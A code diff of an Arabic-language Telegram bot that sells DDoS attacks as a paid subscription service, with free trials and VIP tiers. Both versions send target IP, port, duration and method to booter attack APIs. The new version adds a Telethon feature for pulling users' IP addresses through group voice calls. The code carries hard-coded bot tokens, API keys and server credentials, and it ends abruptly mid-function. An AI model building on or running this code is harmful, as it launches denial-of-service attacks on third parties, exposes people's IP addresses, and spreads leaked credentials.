@@ -1,899 +1,1718 @@
-import logging
-import requests
-import re
+import asyncio
+import json as _json
+import random as _random
+import threading
 import time
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    ApplicationBuilder, 
-    CommandHandler, 
-    CallbackQueryHandler, 
-    MessageHandler, 
-    ChatJoinRequestHandler,
-    ContextTypes, 
-    filters
+import requests
+import telebot
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.tl.functions.channels import GetFullChannelRequest
+from telethon.tl.functions.messages import (
+    CheckChatInviteRequest,
+    ImportChatInviteRequest,
 )
-
-# ----------------- الإعدادات والتوكنات -----------------
-BOT_TOKEN = "7624708352:AAGfIuOPzQNSwNXps7y9FVh3ddgKUt3Bz9A"
-API_KEY = "slm_s5pakHcLKZnvxJfiTGI22Q-9sAFQc_cF"
-
-DEVELOPER_ID = 7493679412  # ⚠️ استبدل هذا الرقم بأيدي المطور الأساسي (المالك)
-DEVELOPER_USERNAME = "z_zgz"
-DEVELOPER_LINK = f"https://t.me/{DEVELOPER_USERNAME}"
-
-USER_COOLDOWN_SECONDS = 60
-STRONG_ATTACK_COOLDOWN_SECONDS = 120  # وقت الانتظار للهجوم القوي (120 ثانية)
-
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
+from telethon.tl.functions.phone import (
+    JoinGroupCallRequest,
+    LeaveGroupCallRequest,
 )
+from telethon.tl.types import ChatInviteAlready, DataJSON, InputPeerSelf
 
-# ----------------- متغيرات النظام (تُحفظ في الذاكرة) -----------------
-CURRENT_ANIMATION_ID = None
-FREE_MODE_ENABLED = False
-FREE_MODE_MAX_TIME = 30  
+TOKEN = "7624708352:AAGfIuOPzQNSwNXps7y9FVh3ddgKUt3Bz9A"
+bot = telebot.TeleBot(TOKEN)
 
-MAX_TIME_REGULAR = 120
-MAX_TIME_VIP = 300
+# إعدادات المطورين
+MAIN_ADMIN = 7493679412
+ADMINS = {MAIN_ADMIN}
+DEV_USERNAME = "XX7X6"  # يوزر المطور بدون @
 
-ACTIVATED_GROUPS = {}  # {chat_id: {"title": str, "max_time": int}}
-CHANNELS_DB = {}       # {"db_key": {"name": str, "link": str, "chat_id": str|int}}
-SUBSCRIBERS_DB = {}    # {user_id: {"name": str, "username": str, "type": "REGULAR"|"VIP", "joined_at": str, "expires_at": datetime}}
+# قائمة الـ APIs الصحيحة والمحدثة
+api_servers = [
+    {
+        "url": "http://212.47.65.141:5001/api/attack",
+        "username": "DARK964",
+        "password": "fgyujbho964",
+    }
+]
 
-# قائمة بحفظ أيديات المستخدمين الذين أرسلوا طلب انضمام
-JOIN_REQUESTS_USER_IDS = set()
+# تتبع الأهداف التي تحت الهجوم حالياً {target_key: expire_time}
+active_attacks_on_targets = {}
 
-DEVELOPERS_LIST = [DEVELOPER_ID]
-PROTECTED_TARGETS = []
-NOTIFICATION_USERS = set()
+# البيانات التخزينية
+subscribers = {}
+allowed_groups = set()
+protected_targets = set()
+mandatory_channels = set()
+all_users = set()
 
-ACTIVE_ATTACKS = []
-USER_LAST_ATTACK = {}
-USER_LAST_STRONG_ATTACK = {}
+# أكواد الاشتراك المنشأة
+created_sub_codes = {}
 
-def is_developer(user_id: int) -> bool:
-    return user_id in DEVELOPERS_LIST
+# تتبع الأشخاص الذين شاهدوا الشروحات
+users_watched_tutorials = {}
 
-def clean_markdown(text: str) -> str:
-    return str(text).replace("_", r"\_")
+# بيانات النظام المجاني والإحالات والمحاولات
+user_attempts = {}
+user_referrals = {}
+user_referral_links = {}
 
-def cleanup_active_attacks():
-    global ACTIVE_ATTACKS
-    now = time.time()
-    ACTIVE_ATTACKS = [exp_time for exp_time in ACTIVE_ATTACKS if exp_time > now]
+# إعدادات أوقات الهجمات الافتراضية
+attack_limits_config = {
+    "group_max_time": 60,
+    "free_max_time": 60,
+    "normal_max_time": 120,
+    "vip_max_time": 300,
+    "admin_max_time": 3600,
+}
 
-# ----------------- فحص وتنظيف اشتراكات المشتركين -----------------
-def check_user_subscription(user_id: int) -> tuple[bool, str, str]:
-    if is_developer(user_id):
-        return True, "مطور البوت 👨‍💻", "غير محدود"
-        
-    if user_id in SUBSCRIBERS_DB:
-        user_info = SUBSCRIBERS_DB[user_id]
-        if datetime.now() < user_info["expires_at"]:
-            exp_str = user_info["expires_at"].strftime("%Y-%m-%d %H:%M")
-            return True, user_info["type"], exp_str
-        else:
-            del SUBSCRIBERS_DB[user_id]
-            
-    if FREE_MODE_ENABLED:
-        return True, "مجاني 🆓", "مفعل للجميع"
-        
-    return False, "غير مشترك ❌", "غير محدد"
+# إعدادات تليثون وسحب الـ IP
+API_ID = 2040
+API_HASH = "b18441a1ff607e10a989891a5462e627"
+user_telethon_sessions = {}
+public_sessions = []
+keep_alive_sessions = {}
+running = True
 
-# ----------------- فحص الاشتراك الإجباري المعدل لروابط طلب الانضمام -----------------
-async def is_user_subscribed(bot, user_id: int) -> tuple[bool, list]:
-    missing_channels = []
-    
-    for ch_key, ch_data in CHANNELS_DB.items():
-        channel_name = ch_data.get("name", "قناة/مجموعة")
-        channel_link = ch_data.get("link", "")
-        chat_target = ch_data.get("chat_id", ch_key)
+tutorials = {
+    "iphone": {
+        "video_id": None,
+        "caption": "لا يوجد شرح متوفر حالياً",
+        "file_id": None,
+    },
+    "android": {
+        "video_id": None,
+        "caption": "لا يوجد شرح متوفر حالياً",
+        "file_id": None,
+    },
+}
+attack_gif_id = None
 
-        # 1. إذا كان المستخدم مسجلاً في القائمة التلقائية لطلبات الانضمام
-        if user_id in JOIN_REQUESTS_USER_IDS:
-            continue
+# الأوضاع والتنبيهات
+free_mode = True
+maintenance_mode = False
+notify_alerts = False
 
-        # 2. إذا كان المدخل رابط طلب انضمام وليس آيدي مباشر
-        if str(chat_target).startswith("http") or "+" in str(chat_target):
-            missing_channels.append((channel_name, channel_link))
-            continue
+user_states = {}
 
-        # 3. الفحص عبر Telegram API المباشر
-        try:
-            member = await bot.get_chat_member(chat_id=chat_target, user_id=user_id)
-            # إذا كان العضو مقيد، غادر، أو تم طرده
-            if member.status in ['left', 'kicked']:
-                missing_channels.append((channel_name, channel_link))
-        except Exception as e:
-            # إذا تعذر الحصول على الحالة وكان هناك طلب انضمام معلق
-            if user_id in JOIN_REQUESTS_USER_IDS:
-                continue
-            logging.error(f"Error checking membership for {ch_key}: {e}")
-            missing_channels.append((channel_name, channel_link))
-            
-    return len(missing_channels) == 0, missing_channels
 
-def get_join_buttons(missing_channels):
-    keyboard = []
-    for channel_name, channel_link in missing_channels:
-        url = channel_link if channel_link else DEVELOPER_LINK
-        keyboard.append([InlineKeyboardButton(text=f"📢 طلب انضمام/اشتراك: {channel_name}", url=url)])
-    keyboard.append([InlineKeyboardButton(text="🔄 تحقق من الانضمام", callback_data="check_subscription")])
-    return InlineKeyboardMarkup(keyboard)
+def is_admin(user_id):
+  return user_id in ADMINS
 
-# ----------------- معالجة طلبات الانضمام تلقائياً -----------------
-async def track_join_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.chat_join_request:
-        user_id = update.chat_join_request.from_user.id
-        JOIN_REQUESTS_USER_IDS.add(user_id)
-        logging.info(f"Received join request from user {user_id}")
 
-# ----------------- لوحات التحكم والأزرار -----------------
-def get_main_keyboard(user_id: int):
-    keyboard = []
-    is_sub, _, _ = check_user_subscription(user_id)
+def check_mandatory_subs(user_id):
+  if is_admin(user_id):
+    return []
+  missing_channels = []
+  for ch in mandatory_channels:
+    try:
+      member = bot.get_chat_member(ch, user_id)
+      if member.status not in ["creator", "administrator", "member"]:
+        missing_channels.append(ch)
+    except Exception:
+      pass
+  return missing_channels
 
-    if is_sub or is_developer(user_id) or FREE_MODE_ENABLED:
-        keyboard.append([InlineKeyboardButton("الهجوم القوي ⚡", callback_data="btn_strong_attack")])
 
-    if is_developer(user_id):
-        notif_text = "جرس التنبيهات 🔔 (مفعل)" if user_id in NOTIFICATION_USERS else "جرس التنبيهات 🔕 (معطل)"
-        keyboard.append([InlineKeyboardButton(notif_text, callback_data="toggle_notif")])
-        keyboard.append([
-            InlineKeyboardButton("إضافة حماية 🛡", callback_data="add_protection"), 
-            InlineKeyboardButton("عرض الأهداف المحمية 📋", callback_data="show_protected")
-        ])
-        keyboard.append([InlineKeyboardButton("⚙️ لوحة تحكم المطور", callback_data="open_admin_panel")])
+def check_subscription(user_id):
+  if is_admin(user_id):
+    return "ADMIN", None
+  if user_id in subscribers:
+    sub = subscribers[user_id]
+    if datetime.now() < sub["end"]:
+      return sub["type"], sub["end"]
     else:
-        keyboard.append([InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)])
+      del subscribers[user_id]
+  return None, None
 
-    return InlineKeyboardMarkup(keyboard)
 
-def get_admin_keyboard():
-    free_status = f"مفعل ✅ ({FREE_MODE_MAX_TIME}s)" if FREE_MODE_ENABLED else "معطل ❌"
-    keyboard = [
-        [InlineKeyboardButton("➕ إضافة مشترك عادي", callback_data="add_sub_regular"), InlineKeyboardButton("⭐ إضافة مشترك VIP", callback_data="add_sub_vip")],
-        [InlineKeyboardButton("👥 عرض المشتركين وإدارتهم", callback_data="manage_subscribers")],
-        [InlineKeyboardButton("➕ إضافة مطور", callback_data="add_dev"), InlineKeyboardButton("➖ حذف مطور", callback_data="del_dev")],
-        [InlineKeyboardButton("👥 عرض المطورين", callback_data="list_devs")],
-        [InlineKeyboardButton(f"الوضع المجاني: {free_status}", callback_data="toggle_free_mode")],
-        [InlineKeyboardButton("المجموعات المفعلة 👥", callback_data="list_groups")],
-        [InlineKeyboardButton("إدارة الاشتراك الإجباري 📢", callback_data="manage_channels")],
-        [InlineKeyboardButton("تغيير المتحركة 🎬", callback_data="set_animation")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+def update_user_attempts(user_id):
+  current_time = time.time()
+  if user_id not in user_attempts:
+    user_attempts[user_id] = {
+        "attempts_left": 10,
+        "max_attempts": 10,
+        "last_reset": current_time,
+    }
+  else:
+    data = user_attempts[user_id]
+    if current_time - data["last_reset"] >= 86400:
+      data["attempts_left"] = data["max_attempts"]
+      data["last_reset"] = current_time
 
-# ----------------- الأوامر الرئيسية -----------------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
 
-    if update.effective_chat.type == "private" and not is_developer(user_id):
-        subscribed, missing = await is_user_subscribed(context.bot, user_id)
-        if not subscribed:
-            reply_markup = get_join_buttons(missing)
-            await update.message.reply_text(
-                "⚠️ **عذراً! يجب عليك الانضمام/إرسال طلب انضمام في القنوات التالية:**",
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-            return
+def get_main_keyboard(user_id):
+  markup = InlineKeyboardMarkup()
+  sub_type, _ = check_subscription(user_id)
+  has_sub = is_admin(user_id) or (sub_type is not None)
 
-    _, sub_type, exp_date = check_user_subscription(user_id)
+  watched = users_watched_tutorials.get(user_id, set())
 
-    start_text = (
-        f"- مرحبا بك {user.first_name} في بوت ضرب الاتصالات 🔥\n\n"
-        f"- نوع اشتراكك ({sub_type})\n\n"
-        f"- تاريخ انتهاء اشتراكك ({exp_date})\n\n"
-        f"- لتنفيذ الهجوم ارسل /hd أو استخدم زر الهجوم القوي ⚡"
+  if has_sub:
+    markup.row(
+        InlineKeyboardButton("⚡ الهجوم القوي", callback_data="strong_attack"),
+        InlineKeyboardButton(
+            "💻 الهجوم الكلاسيكي", callback_data="classic_attack_info"
+        ),
+    )
+    markup.row(
+        InlineKeyboardButton("❖ طرق الهجوم MeThOdS ❖", callback_data="show_methods")
+    )
+    markup.row(
+        InlineKeyboardButton("🎯 سحب IP", callback_data="cmd_extract_ip"),
+        InlineKeyboardButton(
+            "📱 إضافة حساب تليثون", callback_data="login_telethon"
+        ),
+    )
+  else:
+    markup.row(
+        InlineKeyboardButton("⚡ الهجوم القوي", callback_data="strong_attack"),
+        InlineKeyboardButton(
+            "💻 الهجوم الكلاسيكي", callback_data="classic_attack_info"
+        ),
+    )
+    markup.row(
+        InlineKeyboardButton("❖ طرق الهجوم MeThOdS ❖", callback_data="show_methods")
+    )
+    markup.row(
+        InlineKeyboardButton("🎯 سحب IP", callback_data="cmd_extract_ip"),
+        InlineKeyboardButton(
+            "📱 إضافة حساب تليثون", callback_data="login_telethon"
+        ),
+    )
+    if free_mode:
+      markup.row(
+          InlineKeyboardButton("➕ إضافة هجمات +2", callback_data="referral_info"),
+          InlineKeyboardButton(
+              "💎 شراء هجمات لانهائية", url=f"https://t.me/{DEV_USERNAME}"
+          ),
+      )
+
+  tut_row = []
+  if "iphone" not in watched:
+    tut_row.append(
+        InlineKeyboardButton(
+            "📱 الشرح الخاص بالآيفون", callback_data="show_iphone"
+        )
+    )
+  if "android" not in watched:
+    tut_row.append(
+        InlineKeyboardButton(
+            "🤖 الشرح الخاص بالأندرويد", callback_data="show_android"
+        )
     )
 
-    await update.message.reply_text(start_text, reply_markup=get_main_keyboard(user_id))
+  if tut_row:
+    markup.row(*tut_row)
 
-async def open_group_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat = update.effective_chat
-    user = update.effective_user
-
-    if chat.type == "private":
-        await update.message.reply_text("⚠ هذا الأمر يتم استخدامه داخل المجموعات فقط.")
-        return
-
-    if not is_developer(user.id):
-        await update.message.reply_text("🚫 هذا الأمر مخصص للمطور فقط.")
-        return
-
-    bot_member = await chat.get_member(context.bot.id)
-    if bot_member.status not in ["administrator", "creator"]:
-        await update.message.reply_text("⚠️ يرجى رفع البوت مشرفاً في المجموعة أولاً ثم أعد /open.")
-        return
-
-    context.user_data["awaiting_group_max_time"] = chat.id
-    context.user_data["group_title"] = chat.title
-    await update.message.reply_text(
-        f"⚙️ **تفعيل البوت في مجموعة: {chat.title}**\n\n"
-        "يرجى إرسال **أقصى وقت للهجوم (بالثواني)** المسموح به للأعضاء:",
-        parse_mode="Markdown"
+  if is_admin(user_id):
+    markup.row(
+        InlineKeyboardButton(
+            "⚙️ إعدادات المطور والتحكم", callback_data="admin_settings_menu"
+        )
     )
 
-def get_possible_layer_formats(method: str):
-    method_lower = method.lower()
-    l7_keywords = ["http", "tls", "bypass", "flood", "cf", "browser", "get", "post"]
-    if any(k in method_lower for k in l7_keywords):
-        return ["L7", "l7", "7", "layer7", "Layer7"]
-    return ["L4", "l4", "4", "layer4", "Layer4"]
+  return markup
 
-# ----------------- تنفيذ الهجوم بالـ API -----------------
-async def execute_attack_request(bot, chat_id, user, host, port, requested_time, method):
-    global CURRENT_ANIMATION_ID, ACTIVE_ATTACKS, USER_LAST_ATTACK
 
-    user_id = user.id
-    target_str = f"{host}:{port}"
+@bot.message_handler(commands=["start"])
+def start_cmd(message):
+  user_id = message.from_user.id
+  args = message.text.split()
 
-    if target_str in PROTECTED_TARGETS or host in PROTECTED_TARGETS:
-        await bot.send_message(chat_id=chat_id, text="هذا الهدف محمي 🛡")
-        return
+  if message.chat.type == "private":
+    all_users.add(user_id)
+    if len(args) > 1:
+      param = args[1]
+      if param.startswith("sub_") and param in created_sub_codes:
+        code_info = created_sub_codes.pop(param)
+        sub_type = code_info["type"]
+        days = code_info["days"]
+        start_time = datetime.now()
+        end_time = start_time + timedelta(days=days)
+        name = message.from_user.first_name or "مستخدم"
+        username = message.from_user.username or "لا يوجد"
 
-    cleanup_active_attacks()
-    layer_formats = get_possible_layer_formats(method)
-    
-    success = False
-    is_concurrent_full = False
-    api_error_message = ""
-
-    for fmt in layer_formats:
-        full_url = (
-            f"https://slammed.st/api/v1/tasks/start"
-            f"?key={API_KEY}"
-            f"&layer={fmt}"
-            f"&target={host}"
-            f"&port={port}"
-            f"&time={requested_time}"
-            f"&method={method}"
-            f"&concurrents=1"
+        subscribers[user_id] = {
+            "name": name,
+            "username": username,
+            "type": sub_type,
+            "start": start_time.strftime("%Y-%m-%d %H:%M"),
+            "end": end_time,
+        }
+        bot.reply_to(
+            message,
+            f"🎉 مبروك! تم تفعيل اشتراكك بنجاح عبر الرابط!\n\nنوع الاشتراك ⌯"
+            f" {sub_type}\nتاريخ الانتهاء ⌯"
+            f" {end_time.strftime('%Y-%m-%d %H:%M')}",
         )
+      else:
         try:
-            response = requests.get(full_url, timeout=10)
-            data = response.json()
-            if isinstance(data, dict):
-                if data.get("field") == "concurrents" or "concurrent slots" in data.get("message", ""):
-                    is_concurrent_full = True
-                    break
-                elif data.get("ok") is True:
-                    success = True
-                    break
-                else:
-                    api_error_message = data.get("message", "")
-        except Exception as e:
-            logging.error(f"API Request failed: {e}")
-
-    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)]])
-
-    if is_concurrent_full:
-        cleanup_active_attacks()
-        if ACTIVE_ATTACKS:
-            min_exp = min(ACTIVE_ATTACKS)
-            wait_seconds = max(1, int(min_exp - time.time()))
-        else:
-            wait_seconds = int(requested_time)
-
-        busy_msg = (
-            f"🚨 **هناك هجوم قيد التنفيذ حالياً!**\n\n"
-            f"السيرفر مشغول بأقصى عدد هجمات مسموح به.\n"
-            f"⏳ **الوقت المتبقي لتتمكن من استخدام البوت:** `{wait_seconds}` ثانية."
-        )
-        await bot.send_message(chat_id=chat_id, text=busy_msg, parse_mode="Markdown")
-        return
-
-    elif success:
-        expire_time = time.time() + int(requested_time)
-        ACTIVE_ATTACKS.append(expire_time)
-        USER_LAST_ATTACK[user_id] = time.time()
-
-        caption_text = (
-            "تم تنفيذ الهجوم بنجاح 🔥\n"
-            "________________________________\n\n"
-            f"IP ⌯ {host}\n\n"
-            f"Port ⌯ {port}\n\n"
-            f"Time ⌯ {requested_time}\n\n"
-            f"MeThOdS ⌯ {method.upper()}\n"
-            "________________________________"
-        )
-
-        notif_msg = (
-            f"🔔 **تنبيه هجوم جديد!**\n\n"
-            f"👤 المنفذ: {user.first_name} (`{user_id}`)\n"
-            f"🎯 الهدف: `{target_str}`\n"
-            f"⏱ المدة: `{requested_time}` ثانية\n"
-            f"🛠 الطريقة: `{method.upper()}`"
-        )
-        for notify_id in NOTIFICATION_USERS:
-            try:
-                await bot.send_message(chat_id=notify_id, text=notif_msg, parse_mode="Markdown")
-            except Exception:
-                pass
-    else:
-        caption_text = f"🚨 فشل تنفيذ الهجوم!\nالسبب: {api_error_message or 'هذا الهدف تحت الهجوم أو الخادم غير مستجيب حاول بعد 60 ثانية'}"
-
-    if CURRENT_ANIMATION_ID and success:
-        try:
-            await bot.send_animation(
-                chat_id=chat_id,
-                animation=CURRENT_ANIMATION_ID,
-                caption=caption_text,
-                reply_markup=keyboard
-            )
-            return
+          ref_id = int(param)
+          if ref_id != user_id and ref_id in all_users:
+            if user_id not in user_referral_links:
+              user_referral_links[user_id] = ref_id
+              if ref_id not in user_referrals:
+                user_referrals[ref_id] = set()
+              if user_id not in user_referrals[ref_id]:
+                user_referrals[ref_id].add(user_id)
+                if ref_id in user_attempts:
+                  current_max = user_attempts[ref_id]["max_attempts"]
+                  added_val = 2 if current_max < 20 else 1
+                  user_attempts[ref_id]["max_attempts"] += added_val
+                  user_attempts[ref_id]["attempts_left"] += added_val
         except Exception:
-            pass
+          pass
 
-    await bot.send_message(chat_id=chat_id, text=caption_text, reply_markup=keyboard)
+  missing = check_mandatory_subs(user_id)
+  if missing:
+    markup = InlineKeyboardMarkup(row_width=1)
+    for ch in missing:
+      markup.add(
+          InlineKeyboardButton(
+              f"انضم هنا {ch}", url=f"https://t.me/{ch.replace('@', '')}"
+          )
+      )
+    bot.reply_to(
+        message,
+        "⚠️ يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:",
+        reply_markup=markup,
+    )
+    return
 
-# ----------------- معالجة أمر الهجوم العادي /hd -----------------
-async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    user = update.effective_user
-    user_id = user.id
-    now_ts = time.time()
+  sub_type, end_date = check_subscription(user_id)
+  name = message.from_user.first_name or "المستخدم"
 
-    if not is_developer(user_id):
-        subscribed, missing = await is_user_subscribed(context.bot, user_id)
-        if not subscribed:
-            reply_markup = get_join_buttons(missing)
-            await update.message.reply_text(
-                "⚠ **يجب عليك إرسال طلب انضمام/الاشتراك في القنوات لاستخدام الأمر:**",
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-            return
-
-    is_sub, sub_type, _ = check_user_subscription(user_id)
-    allowed_max_time = None
-
-    if is_developer(user_id):
-        allowed_max_time = 3600
-    elif is_sub and sub_type in ["REGULAR", "VIP"]:
-        allowed_max_time = MAX_TIME_VIP if sub_type == "VIP" else MAX_TIME_REGULAR
-    elif chat_id in ACTIVATED_GROUPS:
-        allowed_max_time = ACTIVATED_GROUPS[chat_id]["max_time"]
-    elif FREE_MODE_ENABLED:
-        allowed_max_time = FREE_MODE_MAX_TIME
-    else:
-        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)]])
-        await update.message.reply_text("🚫 البوت غير مصرح لك، تواصل مع المطور أدناه.", reply_markup=keyboard)
-        return
-
-    if not is_developer(user_id) and user_id in USER_LAST_ATTACK:
-        elapsed = now_ts - USER_LAST_ATTACK[user_id]
-        if elapsed < USER_COOLDOWN_SECONDS:
-            remaining_cd = int(USER_COOLDOWN_SECONDS - elapsed)
-            await update.message.reply_text(
-                f"⏳ **يجب عليك الانتظار `{remaining_cd}` ثانية قبل إرسال هجوم آخر!**",
-                parse_mode="Markdown"
-            )
-            return
-
-    if len(context.args) < 4:
-        error_msg = (
-            "⚠ **خطأ في صيغة الأمر!**\n\n"
-            "الصيغة الصحيحة:\n"
-            "`/hd <ip> <port> <time> <method>`\n\n"
-            "مثال:\n"
-            "`/hd 1.2.3.4 53 30 udp-pps`"
+  if not is_admin(user_id) and not sub_type and not free_mode:
+    dev_markup = InlineKeyboardMarkup(row_width=1)
+    dev_markup.add(
+        InlineKeyboardButton(
+            "👨‍💻 تواصل مع المطور لتفعيل الاشتراك",
+            url=f"https://t.me/{DEV_USERNAME}",
         )
-        await update.message.reply_text(error_msg, parse_mode="Markdown")
+    )
+    bot.reply_to(
+        message,
+        "⚠️ البوت ليس مصرحاً لك باستخدامه والوضع المجاني معطل حالياً!\n\nيرجى"
+        " التواصل مع المطور لتفعيل اشتراكك الخاص. 👇",
+        reply_markup=dev_markup,
+    )
+    return
+
+  if is_admin(user_id) or sub_type:
+    sub_name = "مطور 👨‍💻" if is_admin(user_id) else sub_type
+    start_date_str = (
+        subscribers[user_id]["start"]
+        if user_id in subscribers
+        else "دائمي (مطور)"
+    )
+    end_date_str = (
+        end_date.strftime("%Y-%m-%d %H:%M") if end_date else "غير محدود"
+    )
+
+    if end_date:
+      diff = end_date - datetime.now()
+      days = diff.days
+      hours = diff.seconds // 3600
+      minutes = (diff.seconds % 3600) // 60
+      time_left_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة"
+    else:
+      time_left_str = "غير محدود"
+
+    welcome_msg = (
+        f'مرحبا بك يا "{name}" في بوت دارك لضرب الاتصالات\n'
+        "  [L7 ⌯ L4 ⌯ Game]\n"
+        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
+        f"ID ⌯ {user_id}\n"
+        f"نوع اشتراكك ⌯ {sub_name}\n"
+        f"تاريخ تفعيل اشتراكك ⌯ {start_date_str}\n"
+        f"تاريخ انتهاء اشتراكك ⌯ {end_date_str}\n"
+        f"الوقت المتبقي ⌯ {time_left_str}"
+    )
+  else:
+    update_user_attempts(user_id)
+    att_data = user_attempts[user_id]
+    attempts_left = att_data["attempts_left"]
+    total_attempts = att_data["max_attempts"]
+    reset_time_str = datetime.fromtimestamp(
+        att_data["last_reset"] + 86400
+    ).strftime("%Y-%m-%d %H:%M")
+
+    welcome_msg = (
+        f'مرحبا بك يا "{name}" في بوت دارك لضرب الاتصالات\n'
+        "  [L7 ⌯ L4 ⌯ Game]\n"
+        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
+        f"ID ⌯ {user_id}\n"
+        f"اجمالي عدد المحاولات ⌯ {total_attempts}\n"
+        f"عدد المحاولات المتبقيه ⌯ {attempts_left}\n"
+        f"تاريخ تجديد المحاولات ⌯ {reset_time_str}"
+    )
+
+  bot.reply_to(message, welcome_msg, reply_markup=get_main_keyboard(user_id))
+
+
+@bot.message_handler(commands=["open"])
+def open_group_cmd(message):
+  if not is_admin(message.from_user.id):
+    bot.reply_to(message, "⛔ هذا الأمر خاص بالمطور فقط.")
+    return
+  if message.chat.type in ["group", "supergroup"]:
+    allowed_groups.add(message.chat.id)
+    bot.reply_to(
+        message,
+        "✅ تم فتح البوت في هذه المجموعة! (الوقت الأقصى:"
+        f" {attack_limits_config['group_max_time']} ثانية).",
+    )
+
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_listener(call):
+  global free_mode, maintenance_mode, notify_alerts
+
+  user_id = call.from_user.id
+  chat_id = call.message.chat.id
+
+  if call.data == "show_iphone":
+    if user_id not in users_watched_tutorials:
+      users_watched_tutorials[user_id] = set()
+    users_watched_tutorials[user_id].add("iphone")
+
+    data = tutorials["iphone"]
+    if data["video_id"]:
+      bot.send_video(
+          chat_id,
+          data["video_id"],
+          caption=f"📱 شرح آيفون:\n\n{data['caption']}",
+      )
+      if data["file_id"]:
+        bot.send_document(chat_id, data["file_id"])
+    else:
+      bot.send_message(
+          chat_id, "📱 تم إخفاء الزر! لا يوجد شرح آيفون مسجل حالياً."
+      )
+
+    bot.answer_callback_query(
+        call.id, "تم مشاهدة الشرح وسيختفي الزر الآن!", show_alert=True
+    )
+    try:
+      bot.edit_message_reply_markup(
+          chat_id,
+          call.message.message_id,
+          reply_markup=get_main_keyboard(user_id),
+      )
+    except Exception:
+      pass
+    return
+
+  elif call.data == "show_android":
+    if user_id not in users_watched_tutorials:
+      users_watched_tutorials[user_id] = set()
+    users_watched_tutorials[user_id].add("android")
+
+    data = tutorials["android"]
+    if data["video_id"]:
+      bot.send_video(
+          chat_id,
+          data["video_id"],
+          caption=f"🤖 شرح أندرويد:\n\n{data['caption']}",
+      )
+      if data["file_id"]:
+        bot.send_document(chat_id, data["file_id"])
+    else:
+      bot.send_message(
+          chat_id, "🤖 تم إخفاء الزر! لا يوجد شرح أندرويد مسجل حالياً."
+      )
+
+    bot.answer_callback_query(
+        call.id, "تم مشاهدة الشرح وسيختفي الزر الآن!", show_alert=True
+    )
+    try:
+      bot.edit_message_reply_markup(
+          chat_id,
+          call.message.message_id,
+          reply_markup=get_main_keyboard(user_id),
+      )
+    except Exception:
+      pass
+    return
+
+  elif call.data == "admin_settings_menu":
+    if not is_admin(user_id):
+      bot.answer_callback_query(call.id, "⛔ للمطور فقط!", show_alert=True)
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    free_st = "🟢 مفعل" if free_mode else "🔴 معطل"
+    maint_st = "🟢 مفعل" if maintenance_mode else "🔴 معطل"
+    alert_st = "🔔 مفعل" if notify_alerts else "🔕 معطل"
+
+    markup.add(
+        InlineKeyboardButton(
+            f"🎁 الوضع المجاني ({free_st})", callback_data="toggle_free"
+        ),
+        InlineKeyboardButton(
+            f"🔧 وضع الصيانة ({maint_st})", callback_data="toggle_maint"
+        ),
+        InlineKeyboardButton(
+            f"🔔 جرس التنبيهات ({alert_st})", callback_data="toggle_alerts"
+        ),
+        InlineKeyboardButton(
+            "⏱️ تعديل أوقات الهجمات والحدود", callback_data="edit_limits"
+        ),
+        InlineKeyboardButton(
+            "➕ إضافة مشترك عادي/VIP/رابط", callback_data="admin_add_sub_menu"
+        ),
+        InlineKeyboardButton(
+            "❌ إدارة المشتركين والحذف", callback_data="admin_subs_mgmt"
+        ),
+        InlineKeyboardButton(
+            "🌐 إدارة الـ APIs المتعددة", callback_data="admin_api_mgmt"
+        ),
+        InlineKeyboardButton(
+            "🛡️ إدارة الحماية والأهداف", callback_data="admin_prot_mgmt"
+        ),
+        InlineKeyboardButton(
+            "📢 الإذاعة والإحصائيات", callback_data="admin_broadcast_menu"
+        ),
+        InlineKeyboardButton(
+            "📢 الاشتراك الإجباري", callback_data="admin_fsub_menu"
+        ),
+        InlineKeyboardButton(
+            "📱 إضافة حساب عام (للكل)", callback_data="add_public_telethon"
+        ),
+        InlineKeyboardButton(
+            "🎬 تعيين المتحركة GIF", callback_data="set_gif"
+        ),
+        InlineKeyboardButton(
+            "🎥 تعيين الشروحات", callback_data="admin_tut_menu"
+        ),
+        InlineKeyboardButton(
+            "🔙 رجوع للقائمة الرئيسية", callback_data="back_home"
+        ),
+    )
+    bot.edit_message_text(
+        "⚙️ لوحة تحكم وإعدادات المطور:\nاختر ما تحب تعديله:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+    return
+
+  elif call.data == "admin_api_mgmt":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("➕ إضافة API جديد", callback_data="add_api"),
+        InlineKeyboardButton("📋 عرض الـ APIs المضافة", callback_data="show_apis"),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "🌐 إدارة روابط الـ APIs:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "add_api":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_api_info"}
+    bot.send_message(
+        chat_id,
